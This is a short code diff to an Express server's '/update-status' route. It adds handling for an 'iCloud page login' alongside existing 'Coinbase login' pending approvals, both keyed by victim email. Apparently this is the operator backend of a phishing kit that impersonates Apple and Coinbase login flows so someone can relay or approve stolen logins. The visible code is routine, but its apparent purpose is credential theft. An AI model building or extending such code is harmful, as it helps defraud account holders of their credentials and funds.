@@ -268,6 +268,14 @@ app.post("/update-status", (req, res) => {
       return res.status(400).json({ error: "Missing email or status" });
     }
 
+    // ✅ Handle iCloud page login (pendingPage)
+    if (pendingPage[email]) {
+      pendingPage[email].status = status;
+      console.log(`✅ Updated pendingPage[${email}].status = ${status}`);
+      return res.json({ ok: true, message: "iCloud page status updated" });
+    }
+
+    // ✅ Handle Coinbase login (pendingApprovals)
     if (!pendingApprovals[email]) {
       pendingApprovals[email] = {};
     }
